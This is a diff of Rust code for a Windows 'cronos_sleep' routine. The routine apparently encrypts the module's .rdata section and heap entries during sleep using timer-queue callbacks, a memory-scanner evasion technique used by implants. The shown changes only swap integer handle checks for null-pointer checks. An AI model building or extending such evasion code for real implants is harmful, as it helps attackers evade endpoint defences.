@@ -332,7 +332,7 @@ unsafe fn find_rdata_section(base: *const u8) -> (*mut u8, usize) {
 /// `HeapEntry` slots.  The returned count indicates how many were filled.
 unsafe fn collect_heap_entries(entries: &mut [HeapEntry; MAX_HEAP_ENTRIES]) -> usize {
     let heap = GetProcessHeap();
-    if heap == 0 {
+    if heap.is_null() {
         return 0;
     }
 
@@ -385,7 +385,7 @@ pub fn cronos_sleep(duration_ms: u64, heap_enc: bool) -> Result<(), CronosError>
     unsafe {
         // ── Locate the module image ───────────────────────────────────
         let hmodule = GetModuleHandleW(std::ptr::null());
-        if hmodule == 0 {
+        if hmodule.is_null() {
             return Err(CronosError::GetModuleHandle);
         }
         let base_ptr = hmodule as *mut u8;
@@ -420,7 +420,7 @@ pub fn cronos_sleep(duration_ms: u64, heap_enc: bool) -> Result<(), CronosError>
             /* bInitialState */ 0,
             std::ptr::null(),
         );
-        if done_event == 0 || done_event == INVALID_HANDLE_VALUE {
+        if done_event.is_null() || done_event == INVALID_HANDLE_VALUE {
             return Err(CronosError::CreateEvent);
         }
 
@@ -460,13 +460,13 @@ pub fn cronos_sleep(duration_ms: u64, heap_enc: bool) -> Result<(), CronosError>
 
         // ── Set up timer queue ────────────────────────────────────────
         let queue = CreateTimerQueue();
-        if queue == 0 || queue == INVALID_HANDLE_VALUE {
+        if queue.is_null() || queue == INVALID_HANDLE_VALUE {
             CloseHandle(done_event);
             return Err(CronosError::CreateTimerQueue);
         }
 
         // Timer 1: fire the encrypt callback immediately (due_time = 0).
-        let mut enc_timer: HANDLE = 0;
+        let mut enc_timer: HANDLE = core::ptr::null_mut();
         let ok = CreateTimerQueueTimer(
             &mut enc_timer,
             queue,
@@ -487,7 +487,7 @@ pub fn cronos_sleep(duration_ms: u64, heap_enc: bool) -> Result<(), CronosError>
         // strictly after the encrypt callback has completed.
         #[allow(clippy::cast_possible_truncation)]
         let decrypt_due = u64::min(duration_ms.saturating_add(1), u32::MAX as u64) as u32;
-        let mut dec_timer: HANDLE = 0;
+        let mut dec_timer: HANDLE = core::ptr::null_mut();
         let ok = CreateTimerQueueTimer(
             &mut dec_timer,
             queue,
